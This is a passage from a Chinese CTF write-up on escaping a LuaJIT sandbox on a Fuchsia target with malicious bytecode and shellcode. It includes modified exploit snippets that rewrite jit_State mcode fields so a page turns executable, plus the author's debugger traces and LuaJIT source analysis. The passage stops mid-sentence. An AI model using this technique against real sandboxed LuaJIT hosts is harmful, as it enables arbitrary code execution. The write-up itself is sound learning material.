&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来的分析我们基本就是在lua层完成的了，经过大致的观察，发现虽然这个lua沙箱非常弱，明显存在逃逸可能，这里可以查到&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//lua-users.org/wiki/SandBoxes&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;一些资料&lt;/a&gt;，对照查看一下函数是否存在，大概是使用这样的函数:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;function fdb0cdf28c53764e()
    return tostring(loadstring)
end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是可以通过这样的方法去确认有哪些东西是打开的。非常显然，io是没有的（不然就直接做完了），基本思路也就出来了：需要通过&lt;code&gt;loadstring&lt;/code&gt;去完成lua的沙箱逃逸，最终执行shellcode去完成利用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;luajit 沙箱&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;比赛期间的进度&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;好了，现在我们思路已经基本清晰了，接下来就是去一步一步解决问题。第一步当然是解决luajit沙箱的问题，于是我们搜到了&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.corsix.org/content/malicious-luajit-bytecode&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这篇文章&lt;/a&gt;，这篇文章甚至给出了exp，nice！&lt;/p&gt;&lt;p&gt;于是我们下载了luajit的源码，由于目标文件是fuchsia系统的，我们调试不是很方便，所以我们下载了luajit的代码在本地编译之后本地调试，打算在调试成功之后再用于目标fuchsia系统。&lt;/p&gt;&lt;p&gt;接下来。。喜闻乐见：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0c7f010c34dac11fdee5ad4cd8f95a21_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;1043&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;953&quot; data-original=&quot;https://pic2.zhimg.com/v2-0c7f010c34dac11fdee5ad4cd8f95a21_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0c7f010c34dac11fdee5ad4cd8f95a21_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;1043&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;953&quot; data-original=&quot;https://pic2.zhimg.com/v2-0c7f010c34dac11fdee5ad4cd8f95a21_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-0c7f010c34dac11fdee5ad4cd8f95a21_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;ok，太棒了，现在我们不能直接用他的代码了，得自己去分析一下。。目前的问题看起来是代码是成功写入了，但是无法执行，那应该就是权限问题了。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7ea4255b89e7c3464952d3bd18e5e418_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;799&quot; data-rawheight=&quot;770&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;799&quot; data-original=&quot;https://pic1.zhimg.com/v2-7ea4255b89e7c3464952d3bd18e5e418_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7ea4255b89e7c3464952d3bd18e5e418_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;799&quot; data-rawheight=&quot;770&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;799&quot; data-original=&quot;https://pic1.zhimg.com/v2-7ea4255b89e7c3464952d3bd18e5e418_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7ea4255b89e7c3464952d3bd18e5e418_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;好了，基本可以明确是权限问题了，那么我们看看权限改变的地方在哪儿。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    -- The following seven lines result in the memory protection of
    -- the page at asaddr changing from read/write to read/execute.
    -- This is done by setting the jit_State::mcarea and szmcarea
    -- fields to specify the page in question, setting the mctop and
    -- mcbot fields to an empty subrange of said page, and then
    -- triggering some JIT compilation. As a somewhat unfortunate
    -- side-effect, the page at asaddr is added to the jit_State&#39;s
    -- linked-list of mcode areas (the shellcode unlinks it).
    local mcarea = mctab[1]
    mctab[0] = 0
    mctab[1] = asaddr / 2^52 / 2^1022
    mctab[2] = mctab[1]
    mctab[3] = mctab[1]
    mctab[4] = 2^12 / 2^52 / 2^1022
    while mctab[0] == 0 do end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看来是需要看看具体的情况了。我选择了把循环进行一下更改，这样可以在中间断下来看情况(其实最后segfault看也行，但是当时的情况是我以为在中间更改的步骤出了问题，所以不知道问题出在jit之后还是jit之前):&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    -- while mctab[0] == 0 do end
    -- 改为
    local i = 0
    while i &amp;lt; 0x100000 do
        print(i)
    end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在打印过程中&lt;code&gt;ctrl + c&lt;/code&gt;中断，看到当前状态：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-68c1dd4ea1be96cc6f16718f0252bfca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;944&quot; data-rawheight=&quot;562&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;944&quot; data-original=&quot;https://pic3.zhimg.com/v2-68c1dd4ea1be96cc6f16718f0252bfca_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-68c1dd4ea1be96cc6f16718f0252bfca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;944&quot; data-rawheight=&quot;562&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;944&quot; data-original=&quot;https://pic3.zhimg.com/v2-68c1dd4ea1be96cc6f16718f0252bfca_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-68c1dd4ea1be96cc6f16718f0252bfca_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;嗯，有&lt;code&gt;L&lt;/code&gt;，也就是&lt;code&gt;lua_State&lt;/code&gt;，但是没有注释里提到的&lt;code&gt;jit_State&lt;/code&gt;，看来需要去找一下。看看代码：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a60c155aa66ad87f3928b239bc7937e9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;859&quot; data-rawheight=&quot;525&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;859&quot; data-original=&quot;https://pic2.zhimg.com/v2-a60c155aa66ad87f3928b239bc7937e9_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a60c155aa66ad87f3928b239bc7937e9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;859&quot; data-rawheight=&quot;525&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;859&quot; data-original=&quot;https://pic2.zhimg.com/v2-a60c155aa66ad87f3928b239bc7937e9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-a60c155aa66ad87f3928b239bc7937e9_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;由于&lt;code&gt;lua_State&lt;/code&gt;在&lt;code&gt;GG_State&lt;/code&gt;的第一个位置，那么理论上两个指针是一样的，所以可以直接通过&lt;code&gt;*(GG_State*)0x40000378&lt;/code&gt;去查看变量内容：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-73675e547ebf410647a3bfe0d214bc12_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;179&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;795&quot; data-original=&quot;https://pic3.zhimg.com/v2-73675e547ebf410647a3bfe0d214bc12_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-73675e547ebf410647a3bfe0d214bc12_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;179&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;795&quot; data-original=&quot;https://pic3.zhimg.com/v2-73675e547ebf410647a3bfe0d214bc12_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-73675e547ebf410647a3bfe0d214bc12_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;这看起来好像不太对啊，按照注释里的说法，应该是mcarea和szmcarea去表示需要mprotect的页，然后mctop和mcbot指向页内啊。于是我再用同样的方法去尝试了在segfault的时候看状态：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9279d309278e37d5bade819b9a09c962_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;464&quot; data-rawheight=&quot;146&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;464&quot; data-original=&quot;https://pic3.zhimg.com/v2-9279d309278e37d5bade819b9a09c962_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9279d309278e37d5bade819b9a09c962_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;464&quot; data-rawheight=&quot;146&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;464&quot; data-original=&quot;https://pic3.zhimg.com/v2-9279d309278e37d5bade819b9a09c962_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9279d309278e37d5bade819b9a09c962_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;这里基本上就可以看出与注释一致了，那么我们按照注释去修改一下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    local mcarea = mctab[1]
    mctab[0] = asaddr / 2^52 / 2^1022
    mctab[1] = asaddr / 2^52 / 2^1022
    mctab[2] = mctab[1]
    mctab[3] = mctab[1]
    mctab[4] = 2^12 / 2^52 / 2^1022
    --while mctab[0] == 0 do end
    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-dff1ff8565105988be3846ee69342ead_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;184&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;953&quot; data-original=&quot;https://pic2.zhimg.com/v2-dff1ff8565105988be3846ee69342ead_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-dff1ff8565105988be3846ee69342ead_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;184&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;953&quot; data-original=&quot;https://pic2.zhimg.com/v2-dff1ff8565105988be3846ee69342ead_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-dff1ff8565105988be3846ee69342ead_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;于是成功执行了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;赛后的深入思考&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实在比赛期间这个问题我并没有深入去考虑，这其实也是我没有在比赛期间做出来的关键，当时对luajit一知半解，导致后来碰到的问题没有办法去解决，也不知道问题出在什么地方。&lt;/p&gt;&lt;p&gt;事实上等到赛后我已经将exp根据@david492j大佬提供的思路参考完成exp之后，我依然没有想明白为什么当时会出现未调用mprotect的情况。&lt;/p&gt;&lt;p&gt;另外由于其实我最后的问题就在于这个mprotect的调用在zircon里没有进行，所以决定继续跟一下luajit，看看到底是什么原因造成了，说不定这能让我明白我自己的失败之处具体在哪儿。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;luajit的jit&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了看明白代码，我们肯定首先需要一些luajit的前置知识。&lt;/p&gt;&lt;p&gt;首先通过一些资料，我们可以搜到luajit是一个基于trace的jit，翻看一下&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Tracing_just-in-time_compilation&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;wiki&lt;/a&gt;可以学到相关的背景。&lt;/p&gt;&lt;p&gt;基于trace的jit基本过程就是按照循环次数来判断hot loops，找到hot的循环之后，会通过记录运行过程的方式，将记录下的运行过程直接翻译成汇编代码，这样之后的hot loop就会变为执行汇编代码，从而加快速度。感觉这种方式应该算是较为简单的jit方式，因为这样的方式会极大的忽略掉控制流方面的问题，毕竟只需要针对一种trace，这样的线性代码翻译和优化都比较简单。&lt;/p&gt;&lt;p&gt;至于luajit中的代码结构，我是通过看了&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//pwparchive.wordpress.com/2012/10/16/peeking-inside-luajit/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这篇文章&lt;/a&gt;去了解了大致的luajit代码结构的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;调试&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先我修改了一下触发jit附近的代码，去确认到底修改了什么数据：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    local mcarea = mctab[1]
    mctab[0] = 0x1234/ 2^52 / 2^1022
    mctab[1] = 0x4321/ 2^52 / 2^1022
    mctab[2] = 0xdead / 2^52 / 2^1022
    mctab[3] = 0xbeef / 2^52 / 2^1022
    mctab[4] = 2^12 / 2^52 / 2^1022
    local i = 1
    while i &amp;lt; 0x1000000 do 
        i = i + 1 
        --print(i)
    end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;调试结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;  mcprot = 0x0, 
  mcarea = 0x1234 &amp;lt;error: Cannot access memory at address 0x1234&amp;gt;, 
  mctop = 0x4321 &amp;lt;error: Cannot access memory at address 0x4321&amp;gt;, 
  mcbot = 0xdead &amp;lt;error: Cannot access memory at address 0xdead&amp;gt;, 
  szmcarea = 0xbeef, 
  szallmcarea = 0x1000, 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以&lt;code&gt;mctab[0]&lt;/code&gt;对应&lt;code&gt;mcarea&lt;/code&gt;，然后之后的依次类推。&lt;/p&gt;&lt;p&gt;另外，为了快速找到运行位置，我给mprotect下了断点，然后去运行我们能够运行成功的魔改exp，之后通过backtrace去找到关键位置，过程中出现了多次断点，通过比对参数，涉及到目标页的一共有两次：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7d15790 → Name: mprotect()
[#1] 0x555555584b30 → Name: mcode_setprot(prot=0x3, sz=&amp;lt;optimized out&amp;gt;, p=&amp;lt;optimized out&amp;gt;)
[#2] 0x555555584b30 → Name: mcode_protect(J=0x40000558, prot=0x3)
[#3] 0x555555584dba → Name: mcode_protect(prot=0x3, J=0x40000558)
[#4] 0x555555584dba → Name: lj_mcode_reserve(J=0x40000558, lim=0x7fffffffdf38)
[#5] 0x555555597f0b → Name: lj_asm_trace(J=0x40000558, T=0x40000558)
[#6] 0x55555556c690 → Name: trace_state(L=0x40000378, dummy=&amp;lt;optimized out&amp;gt;, ud=0x40000558)
[#7] 0x555555575af6 → Name: lj_vm_cpcall()
[#8] 0x55555556cfeb → Name: lj_trace_ins(J=0x40000558, pc=0x4000ab34)
[#9] 0x555555560b7f → Name: lj_dispatch_ins(L=0x40000378, pc=0x4000ab38)
──────────────────────────────────────────────────────────────────────────────────────────────

─────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7d15790 → Name: mprotect()
[#1] 0x555555584b30 → Name: mcode_setprot(prot=0x5, sz=&amp;lt;optimized out&amp;gt;, p=&amp;lt;optimized out&amp;gt;)
[#2] 0x555555584b30 → Name: mcode_protect(J=0x40000558, prot=0x5)
[#3] 0x555555584f79 → Name: mcode_protect(prot=0x5, J=0x40000558)
[#4] 0x555555584f79 → Name: lj_mcode_abort(J=0x40000558)
[#5] 0x555555584f79 → Name: lj_mcode_limiterr(J=0x40000558, need=0x100)
[#6] 0x5555555904a5 → Name: asm_mclimit(as=0x7fffffffde30)
[#7] 0x5555555986bd → Name: asm_exitstub_gen(group=&amp;lt;optimized out&amp;gt;, as=&amp;lt;optimized out&amp;gt;)
[#8] 0x5555555986bd → Name: asm_exitstub_setup(nexits=&amp;lt;optimized out&amp;gt;, as=0x7fffffffde30)
[#9] 0x5555555986bd → Name: asm_setup_target(as=0x7fffffffde30)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然第二次是关键，是真正将页标记为&lt;code&gt;rx&lt;/code&gt;（prot为5）的。于是根据bt去找到luajit代码的位置，查看需要满足什么条件才能够进入到这一条逻辑：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* Abort the reservation. */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lj_mcode_abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jit_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mcarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mcode_protect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MCPROT_RUN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* Limit of MCode reservation reached. */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lj_mcode_limiterr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jit_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;need&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxmcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lj_mcode_abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JIT_P_sizemcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LJ_PAGESIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LJ_PAGESIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;maxmcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JIT_P_maxmcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;need&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lj_trace_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LJ_TRERR_MCODEOV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* Too long for any area. */&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;szallmcarea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizemcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxmcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lj_trace_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LJ_TRERR_MCODEAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mcode_allocarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lj_trace_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LJ_TRERR_MCODELM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* Retry with new area. */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对比trace可以发现，其实只有&lt;code&gt;lj_mcode_limiterr&lt;/code&gt;是在目标页jit mprotect起作用的时候调用的，中间有一系列&lt;code&gt;asm_*&lt;/code&gt;函数，大致看了一下应该是执行汇编过程，不太可能在这里切换权限，所以核心点就到了&lt;code&gt;trace_state&lt;/code&gt;函数，看代码可以发现其实这里主要是根据不同的jit状态去选择执行不同的行为。&lt;/p&gt;&lt;p&gt;还好我们有可以成功触发mprotect的代码，所以我们可以通过对比成功和失败两种情况来找到关键点，我通过成功触发的代码发现在&lt;code&gt;trace_state&lt;/code&gt;中的执行流程里，成功触发会经过&lt;code&gt;START -&amp;gt; RECORD -&amp;gt; END -&amp;gt; ASM&lt;/code&gt;的过程，而mprotect正是在mprotect中进行调用的（这里保持mprotect的断点，可以在步过的时候快速确认是否运行到了目标位置）。而触发失败的代码没有经过&lt;code&gt;END -&amp;gt; ASM&lt;/code&gt;的过程。&lt;/p&gt;&lt;p&gt;看来我们已经基本上确认问题所在了，那么接下来就到了枯燥的看代码时间，需要通过阅读代码去找到为什么没有经过后两个阶段。&lt;/p&gt;&lt;p&gt;这里我更推荐大家自行去阅读代码理清逻辑，看别人总结的代码是没有意义的，看看别人总结的代码大致逻辑之后自己去看才能真正明白。当然为了完整性，我还是把我的过程记录下来。&lt;/p&gt;&lt;p&gt;简要的说，在&lt;code&gt;RECORD&lt;/code&gt;阶段，会通过&lt;code&gt;lj_record_ins&lt;/code&gt;去record luajit字节码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;// lj_trace.c:trace_state 中
